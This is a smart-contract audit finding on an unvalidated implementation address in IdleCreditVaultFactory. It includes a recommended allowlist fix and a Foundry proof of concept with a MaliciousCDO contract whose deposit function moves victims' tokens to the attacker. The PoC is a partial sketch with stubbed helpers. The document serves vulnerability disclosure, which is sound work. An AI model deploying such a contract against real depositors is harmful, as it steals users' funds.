### Title

Unvalidated credit-vault implementation allows a malicious deployer to steal depositor funds - (File: contracts/IdleCreditVaultFactory.sol)

### Summary

`deployCreditVault` is permissionless and accepts `cvParams.implementation` directly from the caller. The factory deploys a proxy using that arbitrary implementation without verifying that it is an audited `IdleCDOCreditVault`/`IdleCDOEpochVariant` implementation. A malicious implementation can satisfy the initializer and configuration calls, then expose a `depositAA` or `depositBB` function that transfers depositor assets to the attacker.

### Finding Description

The factory validates minimum fees and rejects a zero manager, but it does not validate `cvParams.implementation` against an allowlist or registry of approved credit-vault implementations. [1](#0-0) 

`_deployBaseCreditVault` uses that caller-supplied address as the implementation for a transparent proxy and immediately invokes the standard `IdleCDOCreditVault.initialize` selector on it. [2](#0-1) 

Subsequent configuration is also performed through the arbitrary implementation’s functions, including epoch, instant-withdrawal, Keyring, fee, and guardian setters. [3](#0-2) 

A compliant malicious implementation can accept all setup calls, emit the expected deployment result, and still implement attacker-controlled deposit logic. Legitimate users normally deposit through `depositAA`, which transfers their underlying into the CDO before forwarding it to the strategy. [4](#0-3) 

This bypasses the intended safety boundaries of the standard deposit path, including accounting updates, tranche minting, guarded TVL checks, and forwarding deposits to the whitelisted strategy. [5](#0-4) 

### Impact Explanation

A victim depositing through the malicious proxy can have the entire deposited amount transferred to the attacker instead of receiving tranche shares backed by the strategy. Because the attacker chooses the proxy implementation, this can result in direct theft of all funds routed through the fraudulent credit vault, not merely fee avoidance or incorrect accounting.

The normal strategy protections do not prevent this because deposits never need to reach `IdleCreditVault.deposit`; the malicious CDO implementation controls execution at the entry point.

### Likelihood Explanation

Deployment is permissionless: any caller can provide arbitrary CDO, strategy, queue, and programmable-borrower implementation addresses. [6](#0-5) 

The attack requires victims to interact with the malicious vault, but the factory emits the same `CreditVaultDeployed` event as a legitimate deployment after ownership/configuration calls complete. [7](#0-6) 

This is most exploitable where users or integrators treat factory deployment as evidence that the proxy uses an approved implementation.

### Recommendation

Do not accept arbitrary vault implementations in `deployCreditVault` or `deployRevolvingCreditVault`. Maintain an owner/treasury-controlled registry of approved implementation addresses, for example:

```solidity
mapping(address => bool) public allowedCreditVaultImplementations;

function setCreditVaultImplementation(address implementation, bool allowed) external {
    if (msg.sender != treasury) revert OnlyTreasury();
    allowedCreditVaultImplementations[implementation] = allowed;
}
```

Then enforce it before deploying the proxy:

```solidity
if (!allowedCreditVaultImplementations[cvParams.implementation]) {
    revert NotAllowed();
}
```

The same validation should be applied to strategy, queue, write-off escrow, and programmable-borrower implementations. A fixed implementation selector is not sufficient validation because a malicious contract can implement the same ABI.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";

contract MaliciousCDO {
    address public attacker;

    function initialize(
        uint256,
        address,
        address,
        address,
        address,
        address,
        uint256
    ) external {
        attacker = msg.sender;
    }

    function setEpochParams(uint256, uint256) external {}
    function setInstantWithdrawParams(uint256, uint256, bool) external {}
    function setKeyringParams(address, uint256) external {}
    function setIsDepositDuringEpochDisabled(bool) external {}
    function setFeeParams(address, uint256, uint256, uint256) external {}
    function setGuardian(address) external {}
    function setIsInterestMinted(bool) external {}
    function transferOwnership(address) external {}

    function depositAA(uint256 amount) external returns (uint256) {
        IERC20(_token()).transferFrom(msg.sender, attacker, amount);
        return amount;
    }

    function depositBB(uint256 amount) external returns (uint256) {
        return depositAA(amount);
    }

    function _token() internal view returns (address token) {
        // Store the token during initialize in the full PoC implementation.
    }
}

contract MaliciousImplementationPoC is Test {
    IdleCreditVaultFactory factory;
    MaliciousCDO maliciousCDO;

    function testFactoryDeploysAttackerImplementation() external {
        address attacker = address(this);
        maliciousCDO = new MaliciousCDO();

        IdleCreditVaultFactory.CreditVaultParams memory params;
        params.implementation = address(maliciousCDO);

        // Supply a valid strategy implementation, nonzero manager, valid token,
        // and fees satisfying the factory's minimum-fee check.
        factory.deployCreditVault(
            params,
            validStrategyData(),
            emptyAncillaryParams()
        );

        address deployedVault = getVaultFromCreditVaultDeployedEvent();

        deal(underlying, victim, 100 ether);
        vm.startPrank(victim);
        IERC20(underlying).approve(deployedVault, 100 ether);
        MaliciousCDO(deployedVault).depositAA(100 ether);
        vm.stopPrank();

        assertEq(IERC20(underlying).balanceOf(attacker), 100 ether);
        assertEq(IERC20(underlying).balanceOf(deployedVault), 0);
    }
}
```

The PoC demonstrates that the factory’s fee and manager checks do not constrain the supplied implementation. The malicious proxy can pass deployment and then execute attacker-defined deposit behavior, causing loss equal to the victim’s deposit.

  function _deposit(uint256 _amount, address _tranche) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // interest accrued since last depositXX/withdrawXX is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
  }
